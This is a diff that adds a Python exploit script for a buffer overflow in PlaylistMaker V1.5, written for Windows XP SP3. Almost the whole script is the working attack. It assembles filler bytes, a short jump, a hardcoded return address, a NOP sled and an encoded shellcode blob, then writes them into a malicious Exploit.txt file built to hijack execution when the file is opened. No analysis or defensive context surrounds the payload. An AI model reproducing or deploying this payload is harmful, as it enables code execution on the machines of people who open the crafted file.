@@ -1,0 +1,45 @@
+#!/usr/bin/python
+#
+#[+]Exploit Title: PlaylistMaker V1.5 .TXT File Buffer Overflow Vulnerability
+#[+]Date: 13\04\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://www.softpedia.com/get/Multimedia/Audio/Other-AUDIO-Tools/Playlistmaker.shtml
+#[+]Version: V1.5
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+#
+
+
+from struct import pack
+import os
+from time import sleep
+
+
+print """
+			Exploit Buffer Overflow playlistmaker 1.5
+			Created BY C4SS!0 G0M3S
+			E-mail Louredo_@hotmail.com
+			Site www.exploit-br.org
+ 
+"""
+ 
+buf = "\x42" * 1025
+buf += "\xeb\x10\x90\x90"
+buf += pack('<L',0x5D1D13E5)
+buf += "\x90" * 10
+buf += "\x61\x61\x61\x8B\xC2\x50\xC3"
+buf += "\x41" * (5091-4)
+buf += ("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYKIPVQXIOO3L5FBPXLN9D"
+"46DJTNQ5N0XVQD84XK3M8KL33RXE8L4MUP02XOLSUO92XOFVCKEL3X4NNSM5RNJGJP2ELOOSRJM5M64X"
+"USVQ9WQKWLVSPJUT1XJDFWEZUB4O7SLKKUKUURKZP179M1XKMWRP8EKI2M8YSZW7KCJ8OPL0O7SHSPSY"
+"41GL7XXWKLCLNK35O0WQCSTPQY1VSXML5O6L5IQCNMHJUNJL1UUOX7VMIWMWK9PXYKN0QE1OFTNVOMUT"
+"YK7OGT8FOPYLP3K8W5UCOM83KYZA")
+buf += "\x41" * (19000-len(buf))
+print "\t\t[+]Creating the Exploit File..."
+sleep(1)
+f = open("Exploit.txt","wb")
+f.write("http://"+buf)
+f.close()
+print "\t\t[+]File Created With Success\n"
+sleep(2)
